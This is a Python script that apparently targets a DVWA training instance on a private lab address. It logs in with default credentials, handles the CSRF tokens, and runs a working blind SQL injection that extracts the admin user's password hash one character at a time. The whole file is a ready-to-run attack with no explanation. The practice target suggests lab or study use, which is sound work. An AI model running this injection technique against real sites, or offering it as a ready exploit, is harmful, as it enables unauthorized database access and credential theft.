import string

import requests

DVWA = "http://10.10.7.206"
SECURITY = "low"

def get_csrf_token(data):
    """
    Extracts the CSRF token from the HTML source of the page.
    """
    pos = data.find("user_token")
    if pos == -1:
        return None
    pos = data.find("value=", pos)
    if pos == -1:
        return None
    begin = pos + len("value=") + 1
    end = data.find("'", begin)
    return data[begin:end]


def login():
    """
    Logs in to DVWA and returns the session.
    """
    session = requests.Session()
    session.cookies["security"] = SECURITY
    res = session.get(DVWA)
    res = session.post(DVWA + "/login.php",
                    data={"username": "admin",
                          "password": "password",
                          "Login": "Login",
                          "user_token": get_csrf_token(res.text)
                          })
    return session

def blind_sqli(session, query):
    """
    Performs a blind SQL injection with the given query.
    Returns True of False depending on the result of the query.
    """
    res = session.get(DVWA + "/vulnerabilities/sqli_blind/")
    user_token = get_csrf_token(res.text)
    res = session.get(DVWA + "/vulnerabilities/sqli_blind/",
                      params={
                          "id": query,
                          "Submit": 'ddd',
                          'user_token': user_token
                      })
    if "MISSING" in res.text:
        return False
    return True

def extract_password(session, first_name):
    """
    Extracts the password of the user with the given first name
    """
    extracted = ""
    found_next = True
    while found_next:
        found_next = False
        for char in string.hexdigits:
            if blind_sqli(session, f"22' or (first_name = '{first_name}' and password like '{extracted+char}%'); -- "):
                found_next = True
                extracted += char
                print("found: " + char)
                print("extracted: " + extracted + "\n")
                break
    return extracted

extract_password(login(), "admin")